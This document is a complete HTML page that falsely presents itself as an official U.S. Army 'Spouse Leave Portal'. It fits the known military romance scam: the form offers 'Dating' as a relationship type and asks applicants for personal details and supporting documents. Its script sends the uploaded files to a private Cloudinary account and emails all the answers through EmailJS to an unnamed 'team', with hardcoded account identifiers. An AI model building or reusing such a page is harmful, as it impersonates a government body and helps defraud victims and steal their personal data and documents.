<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>U.S. Army Spouse Leave Application</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    .army-gold { background-color: #ffcc00; color: #1a1a1a; }
    .army-gold-text { color: #ffcc00; }
    .border-army { border-color: #ffcc00; }
  </style>
</head>
<body class="bg-gray-100 text-gray-800">
  <header class="bg-black py-6 shadow-md mb-10">
    <div class="max-w-7xl mx-auto px-4 flex items-center">
      <img src="https://i.imgur.com/y4DFFMe.png" alt="U.S. Army Logo" class="h-14 w-auto mr-4" />
      <div>
        <h1 class="text-3xl font-bold text-white">U.S. Army Spouse Leave Portal</h1>
        <p class="text-gray-300 mt-1">Official military leave application for spouses and families</p>
      </div>
    </div>
  </header>

  <main class="max-w-4xl mx-auto px-4">
    <!-- Application Form -->
    <section id="application" class="mt-16 bg-white p-8 rounded-2xl shadow-md">
      <h2 class="text-2xl font-bold mb-6">Leave Application Form</h2>
      <form id="leaveForm" class="grid gap-4" enctype="multipart/form-data" novalidate>
        <label>Full Name
          <input name="name" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
        </label>
        <label>Email Address
          <input name="email" class="mt-1 p-3 w-full border border-army rounded-lg" type="email" required />
        </label>
        <label>Soldier’s Full Name & Rank
          <input name="rank" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
        </label>
        <label>Relationship Type
          <select name="relationship" class="mt-1 p-3 w-full border border-army rounded-lg" required>
            <option value="Married">Married</option>
            <option value="Dating">Dating</option>
            <option value="Fiancé(e)">Fiancé(e)</option>
          </select>
        </label>
        <label>Reason for Leave
          <textarea name="reason" class="mt-1 p-3 w-full border border-army rounded-lg" rows="4" required></textarea>
        </label>
        <label>Upload Supporting Documents
          <input id="docs" name="docs" class="mt-1 p-3 w-full border border-army rounded-lg" type="file" accept=".pdf,.jpg,.jpeg,.png" required />
        </label>
        <button id="submitBtn" type="submit" class="bg-black text-white font-semibold py-3 px-6 rounded-lg hover:bg-gray-900 transition">Submit Request</button>
      </form>
      <p id="message" class="mt-4 text-center font-semibold"></p>
    </section>
  </main>

  <footer class="bg-black text-army-gold text-sm py-6 mt-10 text-center">
    <p class="text-army-gold">&copy; 2025 United States Army. All rights reserved. | Official Leave Management Division</p>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
  <script>
    (function () {
      emailjs.init('gemkywkuPgyAvxdHD');
    })();

    const form = document.getElementById('leaveForm');
    const submitBtn = document.getElementById('submitBtn');
    const messageEl = document.getElementById('message');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      messageEl.textContent = '';
      
      // Disable submit button and show loading
      submitBtn.disabled = true;
      const originalBtnText = submitBtn.textContent;
      submitBtn.textContent = 'Submitting...';

      try {
        // Get file input
        const fileInput = document.getElementById('docs');
        if (!fileInput.files.length) throw new Error('Please upload a document.');

        // Prepare Cloudinary upload
        const file = fileInput.files[0];
        const formData = new FormData();
        formData.append('file', file);
        formData.append('upload_preset', 'unsigned_preset');

        // Upload to Cloudinary
        const cloudinaryUrl = 'https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload';
        const cloudResp = await fetch(cloudinaryUrl, {
          method: 'POST',
          body: formData,
        });

        if (!cloudResp.ok) throw new Error('Failed to upload document.');

        const cloudData = await cloudResp.json();

        // Prepare email params
        const templateParamsTeam = {
          name: form.name.value,
          email: form.email.value,
          rank: form.rank.value,
          relationship: form.relationship.value,
          reason: form.reason.value,
          document_url: cloudData.secure_url
        };

        const templateParamsApplicant = {
          name: form.name.value,
          email: form.email.value,
          rank: form.rank.value,
          relationship: form.relationship.value,
          reason: form.reason.value,
          // No document URL needed here unless you want to add it
        };

        // Send email to team
        await emailjs.send('service_il4m6rr', 'template_0moxpwa', templateParamsTeam);

        // Send email to applicant
        await emailjs.send('service_il4m6rr', 'template_3tmdj1g', templateParamsApplicant);

        // Show success message
        messageEl.style.color = 'green';
        messageEl.textContent = 'Your leave application was submitted successfully.';

        form.reset();
      } catch (error) {
        messageEl.style.color = 'red';
        messageEl.textContent = error.message || 'An error occurred. Please try again.';
      } finally {
        // Reset button
        submitBtn.disabled = false;
        submitBtn.textContent = originalBtnText;
      }
    });
  </script>
</body>
</html>
